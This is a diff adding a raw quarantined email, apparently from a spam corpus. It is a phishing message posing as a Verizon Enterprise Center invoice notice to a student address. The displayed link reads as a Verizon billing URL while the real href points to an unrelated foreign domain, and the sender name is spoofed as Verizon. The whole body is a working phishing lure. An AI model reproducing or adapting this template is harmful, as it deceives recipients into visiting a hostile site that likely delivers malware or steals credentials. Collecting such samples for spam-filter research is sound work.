@@ -1,0 +1,59 @@
+Return-Path: <warranty.ptk@globe-trucking.com>
+Delivered-To: spam-quarantine
+X-Envelope-To: <widmest1@students.zhaw.ch>
+X-Envelope-To-Blocked: <widmest1@students.zhaw.ch>
+X-Quarantine-ID: <a76YIAguTvTs>
+X-Spam-Flag: YES
+X-Spam-Score: 8.255
+X-Spam-Level: ********
+X-Spam-Status: Yes, score=8.255 tag=2 tag2=6.31 kill=6.31
+	tests=[ALL_TRUSTED=-1, DIGEST_MULTIPLE=0.001,
+	HTML_IMAGE_ONLY_12=1.629, HTML_MESSAGE=0.001, MIME_HTML_ONLY=1.105,
+	PYZOR_CHECK=1.985, RAZOR2_CF_RANGE_51_100=0.365,
+	RAZOR2_CF_RANGE_E8_51_100=2.43, RAZOR2_CHECK=1.729,
+	T_REMOTE_IMAGE=0.01] autolearn=no
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id a76YIAguTvTs for <widmest1@students.zhaw.ch>;
+	Thu,  7 Feb 2019 00:06:20 +0530 (IST)
+Received: from [192.2.18.29] (unknown [181.23.224.5])
+	by mx10.jcbl.com (Postfix) with ESMTPSA id 4A799F440B3
+	for <widmest1@students.zhaw.ch>; Thu,  7 Feb 2019 00:02:51 +0530 (IST)
+Date: Wed, 06 Feb 2019 15:36:21 -0300
+From: notifications@verizon.com <warranty.ptk@globe-trucking.com>
+To: widmest1@students.zhaw.ch
+Message-Id: <lvexFq00exjBrJvZSDOYxtZseCyVTOYh9RD09voijWyfH3Whdcn@students.zhaw.ch>
+Subject: Verizon Enterprise Center Invoice Notification eMail
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<body>
+<p><font face=3D"Arial">
+For the account(s) noted below, Verizon invoice(s) are now available to vie=
+w online via the Verizon Enterprise Center:<br>
+<br>	=20
+Billing Acct. No.<br>=09
+2512612731639<br>
+<br>
+<a href=3D"http://holydayandstyle.eu/DMle_ZYc3d-qkABe/V7/Attachments/2019-0=
+2">https://enterprisecenter.verizon.com/enterprisesolutions/global/dlink/nc=
+as/PdfBillView.do\MAN=3D2512612731639&BAN=3D2512612731639&OSID=3D96&BILLDAT=
+E=3D2019-02-06</a><br>
+<br>
+<br>
+To view the invoice(s) click the Invoices link.<br>
+<br>=20
+Please do not reply to this e-mail message.<br>
+<br>
+Your Verizon Team<br>
+<img src=3D"http://ss7.vzw.com/is/image/VerizonWireless/vz-sig-verizon?$def=
+aultscale$"><br>
+<br>
+If you have received this notification in error, or if you need further ass=
+istance accessing your invoice, please contact Verizon Enterprise Center Su=
+pport at (800) 918-4244.<br>
+</font></p>
+</body>
+</html> 
